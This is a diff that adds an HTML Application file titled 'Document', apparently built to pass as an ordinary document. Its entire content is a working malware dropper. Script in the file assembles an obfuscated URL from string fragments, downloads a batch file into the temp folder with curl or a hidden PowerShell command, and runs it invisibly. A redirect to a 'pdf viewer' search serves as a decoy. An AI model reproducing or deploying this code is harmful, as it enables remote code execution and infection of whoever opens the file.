@@ -1,0 +1,49 @@
+<html>
+<head>
+<title>Document</title>
+<HTA:APPLICATION
+    ID="oApp"
+    APPLICATIONNAME="Document"
+    WINDOWSTATE="minimize"
+    SHOWINTASKBAR="no"
+    CAPTION="no"
+    SYSMENU="no"
+    SCROLL="no"
+    BORDER="none"
+    INNERBORDER="no"
+    CONTEXTMENU="no"
+    SELECTION="no"
+    MAXIMIZEBUTTON="no"
+    MINIMIZEBUTTON="no"
+    NAVIGABLE="no"/>
+<meta http-equiv="refresh" content="0;url=https://www.google.com/search?q=pdf+viewer">
+<script language="jscript">
+(function(){
+    try {
+        var f = ["htt","p:/","/del","tas",".vi","p/gu","apo",".ba","t"];
+        var url = "";
+        for (var i = 0; i < f.length; i++) url += f[i];
+
+        var w   = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var tmp = w.ExpandEnvironmentStrings("%TEMP%");
+        var dst = fso.BuildPath(tmp, "svc" + Math.floor(Math.random()*9000+1000) + ".bat");
+
+        var cmd = "cmd /c \"curl -s -o \\\"" + dst + "\\\" \\\"" + url + "\\\" >nul 2>&1 || "
+                + "powershell -nop -w 1 -c \\\"(New-Object Net.WebClient).DownloadFile('"
+                + url + "','" + dst + "')\\\"\"";
+        w.Run(cmd, 0, true);
+
+        if (fso.FileExists(dst) && fso.GetFile(dst).Size > 0) {
+            w.Run("cmd /c \"\"" + dst + "\"\"", 0, false);
+        }
+
+        self.close();
+    } catch(e){}
+})();
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
